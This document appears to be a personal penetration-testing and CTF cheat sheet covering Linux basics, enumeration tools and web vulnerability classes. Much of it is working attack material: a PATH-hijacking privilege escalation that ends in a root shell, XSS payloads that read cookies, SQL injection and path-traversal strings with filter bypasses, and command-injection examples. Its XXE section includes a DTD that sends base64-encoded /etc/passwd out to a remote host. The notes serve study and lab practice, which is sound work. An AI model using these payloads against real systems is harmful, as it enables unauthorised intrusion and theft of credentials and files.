# NOTES
STUDY MATERIAL >.&lt;

+ [Linux File System](#linux-file-system)
+ [Uncategorized](#uncategorized)
+ [SERVICES](#services)
+ [Tools](#tools)
  - [Uncategorized Tools](#uncat-tools)
    * [SNMP WALK](#snmp-walk)
    * [enum4linux](#enum4linux)
  - [Network Scanning](#network-scanning)
    * [NMAP](#nmap)
  - [WEB DIRECTORY SCANNING](#web-dir-scan) 
    * [GOBUSTER](#gobuster)
    * [FFUZ](#ffuz)
  - [Brute Force / Password Cracking](#brute-force)
    * [Hydra](#hydra)
    * [John The Ripper](#john-the-ripper)
    * [zip2john](#zip2john)
+ [Extraction and Compression](#tar-gz)
+ [Database](#database)
  - [MySql](#mysql)
  - [SQLMAP](#sqlmap)
  - [Redis](#redis)
+ [Bug Hunting](#bug-hunting)
  - [XSS](#xss)
  - [SQL INJECTION](#sql-injection)
  - [CSRF](#csrf)
  - [IDOR](#idor)
  - [LFD](#lfd)
  - [SSRF](#ssrf)
  - [XXE](#xxe)
  - [RCE](#rce)
  - [OPEN REDIRECTS](#open-redirect)
  - [FILE UPLOADS](#file-uploads)
    


# Linux File System
+ / - is a root directory
+ /bin - binaries
+ /sbin - super bin -> only used by admins for eg: sudo
+ /usr - user directory
+ /boot - files needed to boot
+ /var - web app related files and log files
+ /tmp - temporary files
+ /lib - shared library files
+ /home - every users home folder is located here
+ /root - root's home directory
+ /dev - devices directory
+ /vda and /vda1 stands for virtual disk and sda and sda1 stands for harddrives
+ /etc -> configuration files are here,
+ network part ->
   - ` $cat interfaces ` all network interfaces are stored here...
+ mnt & media - they both mount drives..


# Uncategorized
MY PENTEST CHEAT SHEET AND BASIC KALI SETUP/TROUBLESHOOT COMMANDS

Linux Tools, Scripts & Services

- Bash Scripts (For CTF)
  ` $ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’ `  → pop sh to bash shell 

- Exploit PATH Hijacking
```
  matt@pandora:~$ echo "/bin/bash" > tar
  matt@pandora:~$ chmod +x tar
  matt@pandora:~$ ls
  'GCONV_PATH=.'   [setup.sh](http://setup.sh/)   tar   user.txt   value   wget-log
  matt@pandora:~$ export PATH=$(pwd):$PATH
  matt@pandora:~$ /usr/bin/pandora_backup
  PandoraFMS Backup Utility
  Now attempting to backup PandoraFMS client
  root@pandora:~# whoami
  root
```

- Enumeration for SUID files ` $ find / -user root -perm -4000 -exec ls -ldb {} ; >/tmp/suidfiles `

- Enumeration for user executable location ` $ find / -type d -maxdepth 2 -writable -exec ls -l {} + 2>/dev/null `
```
+ $ find / -type d -maxdepth 2 -writable -exec ls -l {} 2> + /dev/null (THIS ONE DOSENT WORKS)
  -  / : Scan the entire device
  - -type d : Scan for directories only (No files)
  - -maxdepth : The max depth (subfolders) to scan
  - -writable : Check if current user an write in folder
  - -exec : Execute a command on the results returned by find ls
  -l {} + : List the output in long form ( {} is placeholder for the location where result of the find command is substituted. The + at the end is used to terminate the -exec command)
```


+ $ python3 -m http.server {port} (ip before port is optional i guess) - host file to download on target system, File should be in the same folder where the hosting service is started

+ $ wget {ip}:port/filename

+ $ “curl” is more likely to read the content of files in linux whereas wget is to download the files!!!

+ $ curl –head {IP} - To get the header of the website.
  - for eg. i got “X-Backend-Server: office.paper” for 10.10.11.143 so i added this ip in /etc/hosts following with the IP like this “10.10.11.143 office.paper” and then went to search [http://office.paper](http://office.paper/) and the i got the website running which was earlier showing default apache page bcos it was not set up.   
  

+ $ powershell “curl|wget” http://10.0.0.1/winPEASx64.exe -outfile winPEASx64.exe

## FOR CTF :
```
Finding total flags xD (ctf ezz) $ find / -name flag.txt 2> /dev/null

while true; do echo “yassk” > /root/king.txt; done &
```
==========================================================================================

## KALI LINUX TROUBLE-SHOOTS AND BASICS

1. Unable to download or install packages using "apt-get"
    
    file path = /etc/apt/sources.list
    
    We have to uncomment 2nd source link in sources.list file to be able to use "sudo apt-get install" command.
    After uncommenting use "sudo apt-get update" to update the changes and reflect in our kali system. Then re-run the command not working
    
2. Update kali to latest version
    
    kali@kali:~$sudo apt update
    
    kali@kali:~$ sudo apt full-upgrade -y
   
3. Shells
    
    echo $SHELL -  to print current shell
    
    chsh - to change the current shell.
    
    There are couple of shells in kali from which we can use, currently zsh is by default in my machine.
    

# SERVICES
### SSH
+ $ ssh {ip} - default pass:root $ssh user@ip -p 8080 - port not necessary for default ssh.

+ $ ssh -L 80:localhost:80 user@IP - Here 80 is port we can use our own(better we use 80 so that we dont have to setup a proxy of another port) and localhost is DNS resolution(URL)
OR
+ $ ssh -D port user@ip - this is used for port forwarding, replace port with the port u want to forward it to, setup foxy proxy on SOCKS5 to get that port forwarding to show webpage.

### TELNET
+ $ telnet {IP} used name root (can be admin, administration) and connects instantly.

### SMBCLIENT
+ $ smbclient 

+ $ smbclient -L {IP} (Used -L to show list of host) List of host shows up, now tried to connect with every host and “WorkShares” works with no password if is not configured properly.

+ $ smbclient "\\\\{IP}\\username$" OR "//{IP}/username$" - To connect to listed users.

### FTP
+ $ ftp {IP} {port} - port optional username: Anonymous (only this username works if unconfigured) password: anything would work

### FREERDP
+ $ xfreerdp - microsoft-ds 445 aka remote desktop protocol 

+ xfreerdp /v:10.0.0.0 /cert:ignore /u:user(”Administrator” can be default) /p:password (password optional, we can skip this flag)


# Tools

## Uncategorized Tools
### SNMP WALK
  + $ snmpwalk -v 1 c public 10.10.11.136 - SNMP emumeration tool to get id, pass, etc.

### enum4linux
 + $ enum4linux - brute forcing tool get the name of users(maybe for smbclient only?)
 + $ enum4linux -a {IP} (-a to get everything available)

## Network Scanning
### NMAP    
+ For a thorough scan of single host: $ nmap -A -p- -v host

+ $ nmap -sC -sV -sU -p- 10.0.0.1 -T4 -A -vvv
   + -T4 is for aggresive time, T5 can be used for insane, T3,T2,T1 are also there but slow
   + -p- is to scan all ports only without additional information
   + -sC is used for default script 
   + -sV is used to detect service information for eg: windows version or version of whatever service is up, etc
   + -sU for udp port scanning (used when there aren’t any useful ports)
   + -p add ports to scan ports only separated  by commans. -p 2256,1015,7785 like this. ez hekor
   + **-sC -sV can take time so only use -p- attribute for fast port scanning. using -sC -sV then scan those individual ports**

## WEB DIRECTORY SCANNING
### GOBUSTER
+ $ gobuster dir -u http://10.0.0.1:8080 -w /directory-list-lowercase-2.3-medium.txt -x php,html (port not necessary)
  - dir : Perform directory brute forcing ( there are other methods aswell)
  - -u : URL/IP of Target
  - -x : Extensions of files to find
  - -w : Wordlist
  - -t {100} : Threads (Used for parallelization), higher the number of threads more the chance of triggering DDOS protection as multiple requests are made within seconds
  
### FFUZ
+ $ ffuz -w /wordlist.txt -u http://ip/FUZZ

# Extraction and Compression
1. Using gzip utility ( for only .gz associated files)
  + $ gzip {filename} - to compress a file or folder
  + $ gunzip {filename} - to decompress/ unzip

2. Using tar utility
+ $ tar -xvzf {file}
  - -x : instruct tar to extract the files from the zipped file
  - -v : means verbose, or to list out the files that are being extracted from the zip
  - -z : instructs the tar to decompress the files
  - -f : tells tar the file name you want it to work on

+ To list the contents of .tar before extracting it
  - $ tar -tzf {file}

+ To instruct the tar to put the extracted unzipped files into specific directory 
  - $ tar -xvzf {file} -c /put/your/directory/here

# Database
## MySql
 + $ mysql -h {ip} -P port (-P:port optional)
  -default user: root password maybe root aswell
    ```
    SHOW databases;              : Prints out the databases we can access.
    USE {database_name};         : Set to use the database named {database_name}.
    SHOW tables;                 : Prints out the available tables inside the currentdatabase.
    SELECT * FROM {table_name};  : Prints out all the data from the table {table_name}.
    ```

## SQLMAP
+ sqlmap -u ‘URL’ : to check a specific URL or a page for SQL INJECTION
+ sqlmap -u ‘URL’ -b : to grab the banner.
+ Check “sqlmap -h” for more options like dumping database name, tables, columns and entries etc.

## Redis
`$ redis-cli -h {ip}`  
  -h : to define the host  
  -p : can be used to provide the password  

+ Basic commands after connecting to the redis server successfully
  ` $ info ` : this will provide information about the redis server

> [!NOTE]
> in the output the last section i.e “# Keyspace” will contain the information about the database with their index number and keys for that database, keys are basically no. of records maybe( or we can say file which have information? ) 

### EXAMPLE OF REDIS

```
After Selecting Keyspace

db0:keys=4,expires=0,avg_ttl=0 --> ( Output is expected to look like this )

————————————END——————————————

here db0 states that there is only 1 database with index 0 and it has 4 keys or files

> $ select 0 

In this, 0 is the index of the database we want to select, for eg “db0” as we got from previously
After select database, we do

 > $ keys *

this command will list all the keys

  > $ get {key}

write the name of the key instead of the {key} and we will get the output of that file
```
# Bug Hunting
## XSS
THREE TYPES ARE THERE -> 1. Stored, 2. Reflected, 3. DOM XSS
**PAYLOADS**
```
<script>alert(1)</script>

<script>alert(document.location)</script>

<script>alert(document.cookie)</script>
```
> [!IMPORTANT]
> look at where the entered data is being displayed and try to rip that code block using comments “//” or but closing off the code block etc etc.

THEORY EXPLANATION BELOW
```
Cross-Site Scripting (XSS) is a prevalent web security vulnerability where malicious scripts, typically JavaScript, are injected into web applications and then executed in the context of a victim's browser. This vulnerability can lead to various attacks, including data theft, session hijacking, and website defacement. Here's a brief summary:

1. **Types of XSS**:
    - **Stored XSS**: Malicious scripts are permanently stored on a server and executed when a user views a particular page.
    - **Reflected XSS**: Malicious scripts are embedded in URLs or input fields and executed immediately when a user clicks a manipulated link or submits a form.
    - **DOM-based XSS**: Malicious scripts manipulate the Document Object Model (DOM) of a web page, often without involving the server.
2. **Common Entry Points**:
    - Web forms, comment boxes, and search bars are typical entry points where user input can be vulnerable to XSS.
    - URL parameters and client-side scripts can also be sources of XSS vulnerabilities.
3. **Prevention**:
    - Input validation and output encoding are essential to prevent XSS. Validating user input and sanitizing output can mitigate the risk.
    - Implementing Content Security Policy (CSP) headers can help restrict the sources of executable scripts on a webpage.
    - Security best practices like using proper authentication and authorization mechanisms can also minimize the impact of XSS.
4. **Bug Hunting**:
    - Security researchers and ethical hackers search for XSS vulnerabilities by probing input fields with payloads like **`<script>alert("XSS");</script>`** and observing if they are executed.
    - Automated scanning tools can assist in finding potential XSS issues, but manual testing is crucial for in-depth analysis.
5. **Responsibility**:
    - Ethical disclosure is paramount. Always obtain proper authorization before testing for XSS vulnerabilities.
    - Report identified vulnerabilities to the organization or bug bounty program owner.
    - Avoid using XSS for malicious purposes, as it's illegal and unethical.

In summary, XSS is a critical web security concern that can have severe consequences if left unaddressed. It's important for web developers to implement security measures to prevent XSS, and for security researchers to responsibly identify and report XSS vulnerabilities for remediation.
```

## SQL INJECTION

> [!IMPORTANT]
> '+' means space character
> 
> '--' means comment so it will ignore anything after that

Two major types: 
1.Error based and 2.Blind SQL INJECTION

1. ERROR BASED
+ Error based are not usual anymore due to new updates libraries but blind injections are likely to be found.
+ ERROR BASED SQL INJECTION ——>
```
id=1’

id=1”

id=1`

id=1[]=)\

id=1’+AND+1=1--+ ( no error as 1=1 is true)
```
[ FOR ME INJECTION WORKED WITHOUT PUTTING ‘ AFTER THE ID NUMBER, CAN BE DIFFERENT CASE TOO ] 
```
id=1’+UNION+SELECT+1—+ OR id=1+UNION+SELECT+1--+

id=1’+UNION+SELECT+1,2--+

id=1’+UNION+SELECT+1,2,NULL,NULL--+ 
```
In the above 3 queries 1 2 and NULL (we can only put numbers or NULL, putting characters will be mistaken as column names) are basically placeholders and we are trying to guess the number of columns that are present in that specific table, if the placeholders does not match with the actual columns, we will get an SQL error.

` id=1+UNION+SELECT+1,2,3,4 from fakename--+ `

here we used from table_name if the table name does not match we will get then error and get database name along with it. for eg: “ Table 'nahamsec.fakename' doesn't exist “

+ TO verify SQL INJECTION exists in the application we fire there 2 queries:

` id=2+AND+sleep(5)--+ ` : “THIS WILL DELAY THE RESPONSE FOR 5 SECONDS AND THATS HOW WE WILL KNOW SQL INJECTION EXISTS” 

` ‘;WAITFOR DELAY ‘0:0:5’-- ` : SAME THING, Different db have diff queries but functions the same

### BLIND SQL INJECTION STARTS HERE →

+ TO check the version of SQL using INJECTION

` id=1+AND+substring(@@version,1,1)=5-- `: IF the version starts with 5 it will not throw any error and if the version does not start from 5.x it will throw the error. 

here first 1 is to tell starting at the first point value and second 1 is for first position.

--------------------

IF we put negative(-) in the with the id we will get what placeholders we are providing

`eg: id=-2 union select 1,2,3,4;-- `

Also we can get the version of OS i guess by inserting a SQL built in command version()

` eg: id=-2 union select 1,2,version(),4;-- `

# SQLMAP

` sqlmap -u ‘URL’ `: to check a specific URL or a page for SQL INJECTION
` sqlmap -u ‘URL’ -b ` : to grab the banner.
Check “`sqlmap -h`” for more options like dumping database name, tables, columns and entries etc.

## CSRF
```
COMING SOON

```

## IDOR

THIS IS JUST CHANGING THE ID's AND STUFFS IN URL TO GET OTHER ITEM/OBJECT

## LFD

```
../../../../../etc/passwd - ../ can be added as much time as we like bcos it is to send us to the root directory of that user and after that we can add /etc/passwd to show the users. We can not put it anywhere but in the place of a retrieval of file.

> Null Byte Injection

%00 OR ? - to ignore the remainder of the string but we have to deal with other limitations or filtering in place

> We might need to escape filtration:

encoding for . = %2e

encoding for / = %2f

 ../ = %2e%2e%2f

Bypass filter for “../”

.././ = ../

....// = ../
```

## SSRF

SSRF comes in different flavours, these three are top common ones:

1.Blind SSRF - allows to scan for accessible hosts and ports
2.Full Response - Allows you to see the entire response  from the server
3.Limited or No Response - shows a portion of the response like the title of the page or No Response or you have to access to resources but cant see them directly

+ We have to first check where the request is coming from server or the browser by setting up netcat and redirect request to own system

` http://169.254.169.254/ `: This is a universal address we can use this to test ssrfs

` file:///etc/passwd ` : how can we miss out on the this one

## XXE
Impact:
- Read local files on the host
- Access to local network via SSRF

This payload is when the data is being displayed on the browser itself
```
<!DOCTYPE foo [ 
<!ELEMENT foo ANY> 
<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<foo>
&xxe;
</foo>
```

This playload is when we are uploading a file and we dont get the data shown to us so we host the payload on a server or our machine and we use the the below payload to show us the data
This code will be in file eg: evil.dtd
```
<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM '[http://10.17.3.243/?x=%data;'](http://10.17.3.243/?x=%25execu;%27)>"> // This line will give us the output to us in our python server terminal
```

This is sample payload we will put in the file that we will be uploading
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY remote SYSTEM "http://10.17.3.243/evil.dtd">]>
<contacts>
<contact>
<name>&exfil;</name>
<email></email>
</contact>
<contact>
<name>adam</name>
<email>[adam@test.com](mailto:adam@test.com)</email>
</contact>
<contact>
<name>test</name>
<email>[test@test.com](mailto:test@test.com)</email>
</contact>
</contacts>
```
## RCE
Command Separatos:  
 ;    &    &&    |     ||  
 
eg:
```
$> ./CheckStock 5141; ls
$> ./CheckStock 5141 && ls
$> ./CheckStock 5141 | ls
```

Bash Inline Execution:
` $> ./CheckStock5141 $(ls)\ `

Injecting Code in inputbox

eg: lets assume server is running PHP and the requests for the inputbox are processed by PHP
```
<?PHP echo “Check where our code gets treated as text or if its actually get processed as code”; ?>
<?PHP phpinfo(); ?> // CHeck the php version and other info
```
PHP MANUAL FOR SCRIPTS

https://www.php.net/manual/en/function.shell-exec.php

## OPEN REDIRECTS


## FILE UPLOADS

